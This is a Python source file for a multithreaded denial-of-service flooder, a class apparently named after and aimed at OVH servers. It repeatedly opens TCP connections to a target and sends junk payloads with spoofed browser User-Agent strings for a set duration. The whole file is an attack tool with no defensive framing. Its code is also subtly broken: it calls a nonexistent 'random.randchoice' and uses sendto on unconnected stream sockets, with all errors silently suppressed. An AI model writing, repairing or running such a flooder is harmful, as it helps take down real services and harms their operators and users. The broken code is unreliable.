import socket, threading, random
from time import sleep
from contextlib import suppress

class ovh:
    def __init__(self, target, port, threads, time):
        self.target = target
        self.port = port
        self.threads = threads
        self.time = time
        self.useragents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
            'Mozilla/5.0 (Windows NT 6.1; rv:14.0) Gecko/20120405 Firefox/14.0a1',
            'Mozilla/5.0 (Windows NT 5.1; rv:14.0) Gecko/20120405 Firefox/14.0a1',
            'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:14.0) Gecko/20100101 Firefox/14.0.1',
            'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0) Gecko/20100101 Firefox/14.0.1',
            'Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US; rv:2.0.4) Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1',
            'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/14.0.1',
            'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/ 20120405 Firefox/14.0.1',
            'Mozilla/5.0 (Windows NT 6.0; rv:14.0) Gecko/20100101 Firefox/14.0.1',
            'Mozilla/5.0 (Windows NT 5.1; rv:15.0) Gecko/20100101 Firefox/13.0.1',
            'Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
            'Mozilla/5.0 (Windows NT 6.1; de;rv:12.0) Gecko/20120403211507 Firefox/12.0',
            'Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20120403211507 Firefox/12.0',
            'Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0',
            'Mozilla/5.0 (compatible; Windows; U; Windows NT 6.2; WOW64; en-US; rv:12.0) Gecko/20120403211507 Firefox/12.0',
            'Mozilla/5.0 (compatible; Windows; U; Windows NT 6.1; en-US; rv:2.0.1) Gecko/20130704 Firefox/4.0.1'
        ]
        self.run()

    def connect_and_send(self):
        while self.time != 0:
            for i in range(10):
                with suppress(Exception), socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    payload = str.encode('\0x\0x\0x\0x\0x\0x'+f"Host: {self.target}\r\n\r\n"+f"User-Agent: {random.randchoice(self.useragents)}\r\n")
                    s.sendto(payload, (self.target, self.port))
                    s.close()

    def track_time(self):
        while self.time != 0:
            sleep(1)
            self.time -= 1

    def run(self):
        for i in range(self.threads):
            threading.Thread(target=self.connect_and_send).start()
        if self.time != 0:
            threading.Thread(target=self.track_time).start()